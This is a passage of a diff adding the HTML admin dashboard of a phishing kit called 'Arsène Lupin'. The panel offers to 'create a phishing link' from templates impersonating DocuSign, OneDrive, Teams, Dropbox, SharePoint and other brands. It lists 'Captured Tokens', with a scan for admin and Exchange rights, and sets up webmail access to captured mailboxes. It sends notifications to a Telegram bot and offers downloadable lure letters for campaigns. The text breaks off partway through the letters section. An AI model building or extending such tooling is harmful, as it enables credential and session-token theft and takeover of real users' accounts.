@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Arsène Lupin • Dashboard</title>
+  <link rel="stylesheet" href="../css/admin.css">
+</head>
+<body>
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <div class="logo">
+        <!-- Arsène Lupin Gentleman Thief SVG Logo -->
+        <svg width="42" height="42" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="sGold" x1="0" y1="0" x2="120" y2="120">
+              <stop offset="0%" stop-color="#e8c87a"/>
+              <stop offset="50%" stop-color="#d4a853"/>
+              <stop offset="100%" stop-color="#c49a3c"/>
+            </linearGradient>
+            <linearGradient id="sDark" x1="0" y1="0" x2="0" y2="120">
+              <stop offset="0%" stop-color="#1a1825"/>
+              <stop offset="100%" stop-color="#0e0d15"/>
+            </linearGradient>
+          </defs>
+          <rect width="120" height="120" rx="28" fill="url(#sDark)" stroke="url(#sGold)" stroke-width="2"/>
+          <!-- Top Hat -->
+          <ellipse cx="60" cy="35" rx="24" ry="3.5" fill="url(#sGold)" opacity="0.85"/>
+          <rect x="44" y="16" width="32" height="19" rx="3" fill="url(#sGold)" opacity="0.8"/>
+          <rect x="44" y="29" width="32" height="3.5" rx="1" fill="#0e0d15" opacity="0.5"/>
+          <rect x="55" y="29.5" width="10" height="2.5" rx="0.5" fill="url(#sGold)" opacity="0.6"/>
+          <!-- Head -->
+          <ellipse cx="60" cy="57" rx="17" ry="19" fill="#0e0d15"/>
+          <!-- Mask -->
+          <path d="M40 51 C40 51 46 45 60 45 C74 45 80 51 80 51 C80 51 76 58 71 58 C67 58 64 55 60 55 C56 55 53 58 49 58 C44 58 40 51 40 51Z" fill="url(#sGold)" opacity="0.8"/>
+          <ellipse cx="51" cy="51.5" rx="5.5" ry="4" fill="#0e0d15"/>
+          <ellipse cx="69" cy="51.5" rx="5.5" ry="4" fill="#0e0d15"/>
+          <!-- Monocle -->
+          <circle cx="69" cy="51.5" r="8.5" fill="none" stroke="url(#sGold)" stroke-width="1.5" opacity="0.85"/>
+          <path d="M77.5 51.5 Q83 57 80 70 Q78 78 75 83" fill="none" stroke="url(#sGold)" stroke-width="0.7" opacity="0.4" stroke-dasharray="2,2"/>
+          <!-- Smirk -->
+          <path d="M53 66 Q57 70 60 69 Q63 70 67 66" fill="none" stroke="url(#sGold)" stroke-width="1.2" opacity="0.5" stroke-linecap="round"/>
+          <!-- Bow tie -->
+          <path d="M55 78 L60 75 L65 78 L60 81 Z" fill="url(#sGold)" opacity="0.45"/>
+          <!-- Corners -->
+          <path d="M16 16 Q16 26 26 26" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+          <path d="M104 16 Q104 26 94 26" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+          <path d="M16 104 Q16 94 26 94" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+          <path d="M104 104 Q104 94 94 94" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+        </svg>
+        <div class="logo-text">
+          <span class="logo-title">Arsène Lupin</span>
+          <span class="logo-subtitle">Gentleman's Quarters</span>
+        </div>
+      </div>
+    </div>
+    
+    <div class="sidebar-label">NAVIGATION</div>
+
+    <nav class="sidebar-nav">
+      <a href="#" class="nav-link active" data-section="dashboard">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path d="M3 4a1 1 0 011-1h12a1 1 0 011 1v2a1 1 0 01-1 1H4a1 1 0 01-1-1V4zM3 10a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H4a1 1 0 01-1-1v-6zM14 9a1 1 0 00-1 1v6a1 1 0 001 1h2a1 1 0 001-1v-6a1 1 0 00-1-1h-2z"/>
+        </svg>
+        <span>Dashboard</span>
+      </a>
+      
+      <a href="#" class="nav-link" data-section="links">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path d="M12.586 4.586a2 2 0 112.828 2.828l-3 3a2 2 0 01-2.828 0 1 1 0 00-1.414 1.414 4 4 0 005.656 0l3-3a4 4 0 00-5.656-5.656l-1.5 1.5a1 1 0 101.414 1.414l1.5-1.5zm-5 5a2 2 0 012.828 0 1 1 0 101.414-1.414 4 4 0 00-5.656 0l-3 3a4 4 0 105.656 5.656l1.5-1.5a1 1 0 10-1.414-1.414l-1.5 1.5a2 2 0 11-2.828-2.828l3-3z"/>
+        </svg>
+        <span>Generated Links</span>
+      </a>
+      
+      <a href="#" class="nav-link" data-section="tokens">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"/>
+        </svg>
+        <span>Captured Tokens <span id="tokenCount" style="opacity: 0.5; font-size: 11px;"></span></span>
+      </a>
+      
+      <a href="#" class="nav-link" data-section="webmail">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+          <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+        </svg>
+        <span>Webmail Users</span>
+      </a>
+
+      <a href="#" class="nav-link" data-section="letters">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z"/>
+        </svg>
+        <span>Letters <span style="background:#3b82f6;color:#fff;border-radius:10px;padding:1px 6px;font-size:10px;margin-left:4px">NEW</span></span>
+      </a>
+
+      <div class="sidebar-label" style="margin-top: 16px;">SYSTEM</div>
+      
+      <a href="#" class="nav-link" data-section="settings">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.532 1.532 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.532 1.532 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z"/>
+        </svg>
+        <span>Settings</span>
+      </a>
+    </nav>
+    
+    <div class="sidebar-footer">
+      <div class="sidebar-user">
+        <div class="user-avatar">A</div>
+        <div class="user-info">
+          <span class="user-name">Admin</span>
+          <span class="user-role">Panel Owner</span>
+        </div>
+      </div>
+      <button class="logout-btn" onclick="logout()">
+        <svg width="18" height="18" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M3 3a1 1 0 011-1h12a1 1 0 011 1v12a1 1 0 01-1 1H4a1 1 0 01-1-1V3zm10.293 9.293a1 1 0 001.414 1.414l3-3a1 1 0 000-1.414l-3-3a1 1 0 10-1.414 1.414L14.586 9H7a1 1 0 100 2h7.586l-1.293 1.293z" clip-rule="evenodd"/>
+        </svg>
+        <span>Logout</span>
+      </button>
+    </div>
+  </aside>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <!-- Header -->
+    <header class="header">
+      <div class="header-left">
+        <!-- Small Lupin emblem in header -->
+        <svg class="header-emblem" width="28" height="28" viewBox="0 0 120 120" fill="none">
+          <defs>
+            <linearGradient id="hGold" x1="0" y1="0" x2="120" y2="120">
+              <stop offset="0%" stop-color="#e8c87a"/>
+              <stop offset="100%" stop-color="#c49a3c"/>
+            </linearGradient>
+          </defs>
+          <circle cx="60" cy="60" r="56" fill="none" stroke="url(#hGold)" stroke-width="2" opacity="0.4"/>
+          <ellipse cx="60" cy="35" rx="20" ry="3" fill="url(#hGold)" opacity="0.6"/>
+          <rect x="46" y="18" width="28" height="17" rx="2" fill="url(#hGold)" opacity="0.5"/>
+          <path d="M42 51 C42 51 48 46 60 46 C72 46 78 51 78 51 C78 51 75 57 70 57 C66 57 64 54 60 54 C56 54 54 57 50 57 C45 57 42 51 42 51Z" fill="url(#hGold)" opacity="0.5"/>
+          <circle cx="69" cy="51" r="7" fill="none" stroke="url(#hGold)" stroke-width="1" opacity="0.5"/>
+        </svg>
+        <h1 id="pageTitle">Dashboard</h1>
+      </div>
+      <div class="header-actions">
+        <div class="header-time" id="headerTime"></div>
+        <button class="btn-icon" title="Notifications">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"/>
+          </svg>
+        </button>
+      </div>
+    </header>
+
+    <!-- Dashboard Section -->
+    <section id="dashboard-section" class="content-section active">
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-icon" style="background: rgba(16, 185, 129, 0.08); color: #10b981;">
+            <svg width="24" height="24" viewBox="0 0 20 20" fill="currentColor">
+              <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"/>
+            </svg>
+          </div>
+          <div class="stat-content">
+            <div class="stat-label">Total Captures</div>
+            <div class="stat-value" id="totalCaptures">0</div>
+          </div>
+        </div>
+
+        <div class="stat-card">
+          <div class="stat-icon" style="background: rgba(139, 92, 246, 0.08); color: #a78bfa;">
+            <svg width="24" height="24" viewBox="0 0 20 20" fill="currentColor">
+              <path d="M2 11a1 1 0 011-1h2a1 1 0 011 1v5a1 1 0 01-1 1H3a1 1 0 01-1-1v-5zM8 7a1 1 0 011-1h2a1 1 0 011 1v9a1 1 0 01-1 1H9a1 1 0 01-1-1V7zM14 4a1 1 0 011-1h2a1 1 0 011 1v12a1 1 0 01-1 1h-2a1 1 0 01-1-1V4z"/>
+            </svg>
+          </div>
+          <div class="stat-content">
+            <div class="stat-label">Active Sessions</div>
+            <div class="stat-value" id="activeSessions">0</div>
+          </div>
+        </div>
+
+        <div class="stat-card">
+          <div class="stat-icon" style="background: rgba(212, 168, 83, 0.08); color: #d4a853;">
+            <svg width="24" height="24" viewBox="0 0 20 20" fill="currentColor">
+              <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+              <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+            </svg>
+          </div>
+          <div class="stat-content">
+            <div class="stat-label">Generated Links</div>
+            <div class="stat-value" id="totalLinks">0</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="dashboard-card">
+        <div class="card-header">
+          <h3>Recent Captures</h3>
+        </div>
+        <div id="recentCapturesList">
+          <div class="empty-state-small">No captures yet</div>
+        </div>
+      </div>
+
+      <div style="height: 24px;"></div>
+
+      <div class="dashboard-card">
+        <div class="card-header">
+          <h3>Active Sessions</h3>
+          <button class="icon-btn" onclick="loadActiveSessions()" title="Refresh">
+            <svg width="16" height="16" viewBox="0 0 20 20" fill="currentColor">
+              <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"/>
+            </svg>
+          </button>
+        </div>
+        <div id="activeSessionsList">
+          <div class="empty-state-small">No active sessions</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Links Section -->
+    <section id="links-section" class="content-section">
+      <div class="create-link-section">
+        <h2>Create New Link</h2>
+        <p class="text-muted">Select a template and create a phishing link</p>
+        
+        <div class="form-group">
+          <label>Template Design</label>
+          <div class="template-grid-inline">
+            <!-- DocuSign -->
+            <div class="template-card-inline selected" data-template="docusign" onclick="selectTemplateInline('docusign')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#1e1c3d">
+                  <div class="preview-logo-tiny" style="background:#4744A4;color:#fff;font-size:9px;font-weight:900">D</div>
+                  <div class="preview-code-tiny" style="color:#ffcb00;font-size:8px">REVIEW</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>DocuSign</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('docusign', event)">Preview</button>
+              </div>
+            </div>
+
+            <!-- OneDrive -->
+            <div class="template-card-inline" data-template="onedrive" onclick="selectTemplateInline('onedrive')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#0078D4">
+                  <div class="preview-logo-tiny" style="background:rgba(255,255,255,.2);color:#fff;font-size:9px">☁</div>
+                  <div class="preview-code-tiny" style="color:#fff;font-size:8px">OneDrive</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>OneDrive</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('onedrive', event)">Preview</button>
+              </div>
+            </div>
+
+            <!-- Voicemail -->
+            <div class="template-card-inline" data-template="voicemail" onclick="selectTemplateInline('voicemail')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#111">
+                  <div class="preview-logo-tiny" style="background:#0070f3;color:#fff;font-size:13px">📞</div>
+                  <div class="preview-code-tiny" style="color:#888;font-size:8px">MISSED</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Voicemail</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('voicemail', event)">Preview</button>
+              </div>
+            </div>
+
+            <!-- ShareFile -->
+            <div class="template-card-inline" data-template="sharefile" onclick="selectTemplateInline('sharefile')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#fff5f0">
+                  <div class="preview-logo-tiny" style="background:#FF5800;color:#fff;font-size:8px;font-weight:900">SF</div>
+                  <div class="preview-code-tiny" style="color:#FF5800;font-size:8px">SECURE</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>ShareFile</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('sharefile', event)">Preview</button>
+              </div>
+            </div>
+
+            <!-- Adobe -->
+            <div class="template-card-inline" data-template="adobe" onclick="selectTemplateInline('adobe')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#1a1a1a">
+                  <div class="preview-logo-tiny" style="background:#FA0F00;color:#fff;font-size:9px;font-weight:900">Ac</div>
+                  <div class="preview-code-tiny" style="color:#fff;font-size:8px">ADOBE</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Adobe Sign</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('adobe', event)">Preview</button>
+              </div>
+            </div>
+
+            <!-- Quarantine -->
+            <div class="template-card-inline" data-template="quarantine" onclick="selectTemplateInline('quarantine')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#fff8f8">
+                  <div class="preview-logo-tiny" style="background:#d83b01;color:#fff;font-size:13px">⚠️</div>
+                  <div class="preview-code-tiny" style="color:#d83b01;font-size:8px">WARNING</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Quarantine</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('quarantine', event)">Preview</button>
+              </div>
+            </div>
+
+            <!-- NEW TEMPLATES -->
+            <div class="template-card-inline" data-template="teams" onclick="selectTemplateInline('teams')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#f0f0f8">
+                  <div class="preview-logo-tiny" style="background:#6264A7;color:#fff;font-size:11px;font-weight:800">T</div>
+                  <div class="preview-code-tiny" style="color:#6264A7;font-size:8px">TEAMS</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>MS Teams</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('teams', event)">Preview</button>
+              </div>
+            </div>
+
+            <div class="template-card-inline" data-template="dropbox" onclick="selectTemplateInline('dropbox')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#e8f0ff">
+                  <div class="preview-logo-tiny" style="background:#0061FF;color:#fff;font-size:11px;font-weight:800">DB</div>
+                  <div class="preview-code-tiny" style="color:#0061FF;font-size:8px">DROPBOX</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Dropbox</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('dropbox', event)">Preview</button>
+              </div>
+            </div>
+
+            <div class="template-card-inline" data-template="zoom" onclick="selectTemplateInline('zoom')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#e8f4ff">
+                  <div class="preview-logo-tiny" style="background:#2D8CFF;color:#fff;font-size:11px;font-weight:800">▶</div>
+                  <div class="preview-code-tiny" style="color:#2D8CFF;font-size:8px">ZOOM</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Zoom</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('zoom', event)">Preview</button>
+              </div>
+            </div>
+
+            <div class="template-card-inline" data-template="box" onclick="selectTemplateInline('box')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#e6f0ff">
+                  <div class="preview-logo-tiny" style="background:#0061D5;color:#fff;font-size:11px;font-weight:800">Box</div>
+                  <div class="preview-code-tiny" style="color:#0061D5;font-size:8px">SECURE</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Box</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('box', event)">Preview</button>
+              </div>
+            </div>
+
+            <div class="template-card-inline" data-template="sharepoint" onclick="selectTemplateInline('sharepoint')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small" style="background:#e8f5f5">
+                  <div class="preview-logo-tiny" style="background:#038387;color:#fff;font-size:13px;font-weight:900">S</div>
+                  <div class="preview-code-tiny" style="color:#038387;font-size:8px">SHAREPOINT</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>SharePoint</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('sharepoint', event)">Preview</button>
+              </div>
+            </div>
+          </div>
+          <input type="hidden" id="linkTemplateInline" value="docusign">
+          <small>Choose a template design for your phishing link</small>
+        </div>
+
+        <div class="form-group">
+          <label>Redirect URL</label>
+          <input type="url" id="redirectUrlInline" placeholder="https://www.office.com" value="https://www.office.com">
+          <small>Where to redirect users after token capture</small>
+        </div>
+
+
+        <button class="btn-primary" onclick="createLinkInline()">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M10 3a1 1 0 011 1v5h5a1 1 0 110 2h-5v5a1 1 0 11-2 0v-5H4a1 1 0 110-2h5V4a1 1 0 011-1z"/>
+          </svg>
+          Create Link
+        </button>
+      </div>
+
+      <div class="generated-links-section">
+        <h2>Generated Links</h2>
+        <div class="links-list" id="linksGrid">
+          <div class="empty-state">
+            <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+              <circle cx="32" cy="32" r="32" fill="rgba(255,255,255,0.03)"/>
+              <path d="M32 20v24M20 32h24" stroke="#64748b" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            <h3>No links created yet</h3>
+            <p>Create your first link above</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Tokens Section -->
+    <section id="tokens-section" class="content-section">
+      <div class="section-header">
+        <button class="btn-secondary" onclick="loadAllTokens()">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"/>
+          </svg>
+          Refresh
+        </button>
+        <button class="btn-secondary" onclick="backfillCapabilities()" id="backfillBtn" title="Scan all existing tokens for admin roles and Exchange capabilities">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"/>
+          </svg>
+          🔍 Scan Existing Tokens
+        </button>
+      </div>
+      <div id="tokensContainer">
+        <div class="empty-state">
+          <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+            <circle cx="32" cy="32" r="32" fill="rgba(255,255,255,0.03)"/>
+            <path d="M32 20L40 28L32 36M24 28h16" stroke="#64748b" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <h3>No tokens captured yet</h3>
+          <p>Tokens will appear here when users authenticate</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Webmail Section - Credentials Management -->
+    <section id="webmail-section" class="content-section">
+      <div class="create-link-section">
+        <h2>Create Webmail User</h2>
+        <p class="text-muted">Create login credentials for external mailbox access</p>
+
+        <div class="form-group">
+          <label>Select Email Profile</label>
+          <select id="webmailProfile" required>
+            <option value="">-- Select Profile --</option>
+          </select>
+          <small>Choose which captured email account to link</small>
+        </div>
+
+        <div class="form-group">
+          <label>Username</label>
+          <input type="text" id="webmailUsername" placeholder="Enter username">
+          <small>Username for webmail login</small>
+        </div>
+
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="webmailPassword" placeholder="Enter password">
+          <small>Minimum 6 characters</small>
+        </div>
+
+        <button class="btn-primary" onclick="createWebmailUserInline()">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M10 3a1 1 0 011 1v5h5a1 1 0 110 2h-5v5a1 1 0 11-2 0v-5H4a1 1 0 110-2h5V4a1 1 0 011-1z"/>
+          </svg>
+          Create Webmail User
+        </button>
+      </div>
+
+      <div class="generated-links-section">
+        <h2>Webmail Users &amp; Credentials</h2>
+        <div id="webmailContainer"></div>
+      </div>
+    </section>
+
+    <!-- Settings Section -->
+    <section id="settings-section" class="content-section">
+      <div class="settings-card">
+        <h2>Telegram Configuration</h2>
+        <p class="text-muted">Configure Telegram bot for notifications</p>
+        
+        <div class="form-group">
+          <label>Telegram Bot Token</label>
+          <input type="text" id="telegramToken" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
+          <small>Get from @BotFather on Telegram</small>
+        </div>
+        
+        <div class="form-group">
+          <label>Telegram Chat ID</label>
+          <input type="text" id="telegramChatId" placeholder="123456789">
+          <small>Get from @userinfobot on Telegram</small>
+        </div>
+        
+        <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+          <button class="btn-primary" onclick="saveTelegramSettings()">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+              <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"/>
+            </svg>
+            Save Telegram Settings
+          </button>
+          <button class="btn-secondary" onclick="testTelegram()">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+              <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+              <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+            </svg>
+            Test Telegram
+          </button>
+        </div>
+        
+        <hr style="margin: 36px 0; border: none; border-top: 1px solid rgba(212,168,83,0.06);">
+        
+        <h2>Security</h2>
+        <p class="text-muted">Change your admin panel password</p>
+        
+        <div class="form-group">
+          <label>Current Password</label>
+          <input type="password" id="currentPassword" placeholder="Enter current password">
+        </div>
+        
+        <div class="form-group">
+          <label>New Password</label>
+          <input type="password" id="newPassword" placeholder="Enter new password">
+          <small>Minimum 6 characters</small>
+        </div>
+        
+        <div class="form-group">
+          <label>Confirm New Password</label>
+          <input type="password" id="confirmPassword" placeholder="Confirm new password">
+        </div>
+        
+        <button class="btn-primary" onclick="saveSettings()">Save All Settings</button>
+      </div>
+    </section>
+
+    <!-- ── Letters Section ───────────────────────────────────────────────── -->
+    <section id="letters-section" class="content-section">
+      <div style="padding:0 0 24px">
+        <h2 style="font-size:22px;font-weight:700;margin-bottom:6px">📄 Letter Templates</h2>
+        <p class="text-muted">Download or preview realistic letter templates matched to each phishing template. Use as email attachments or lures alongside your campaigns.</p>
+      </div>
+
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:18px">
+
+        <!-- DocuSign -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #4744A4;border-top:3px solid #4744A4;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#4744A4;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#FFCB00">D</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">DocuSign Letter</div>
+              <div style="font-size:11px;color:#4744A4">Signature Request · eSignature</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Professional DocuSign-branded letter requesting electronic signature. Purple/yellow CSS logo, 4-step signing guide, document preview card.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/docusign_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(71,68,164,.2);color:#9b99ff;border:1px solid #4744A4;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/docusign_letter" download="DocuSign_Letter.html" style="flex:1;background:#4744A4;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- OneDrive -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #0078D4;border-top:3px solid #0078D4;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#0078D4;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:20px">☁</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">OneDrive Letter</div>
+              <div style="font-size:11px;color:#0078D4">Microsoft 365 · File Share</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Microsoft blue corporate letter. CSS 4-square logo, CSS OneDrive cloud icon, CSS Excel file preview, permission labels.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/onedrive_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(0,120,212,.2);color:#60a5fa;border:1px solid #0078D4;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/onedrive_letter" download="OneDrive_Letter.html" style="flex:1;background:#0078D4;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
+          </div>
+        </div>
+
+        <!-- ShareFile -->
+        <div style="background:rgba(255,255,255,.04);border:1px solid #FF5800;border-top:3px solid #FF5800;border-radius:10px;padding:22px;display:flex;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:center;gap:12px">
+            <div style="width:42px;height:42px;background:#FF5800;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;color:#fff">SF</div>
+            <div>
+              <div style="font-size:14px;font-weight:700;color:#e2e8f0">ShareFile Letter</div>
+              <div style="font-size:11px;color:#FF5800">Citrix · Secure File Transfer</div>
+            </div>
+          </div>
+          <p style="font-size:12px;color:#94a3b8;line-height:1.6">Orange enterprise letter, receipt-style file details, 4-trust-badge row (AES, HIPAA, SOC2, GDPR). Panel-style CTA button.</p>
+          <div style="display:flex;gap:8px">
+            <button onclick="window.open('/letters/sharefile_letter','_blank','width=780,height=700')" style="flex:1;background:rgba(255,88,0,.2);color:#fb923c;border:1px solid #FF5800;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit">👁 Preview</button>
+            <a href="/letters/sharefile_letter" download="ShareFile_Letter.html" style="flex:1;background:#FF5800;color:#fff;border:none;border-radius:6px;padding:9px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;text-decoration:none;display:flex;align-items:center;justify-content:center">⬇ Download</a>
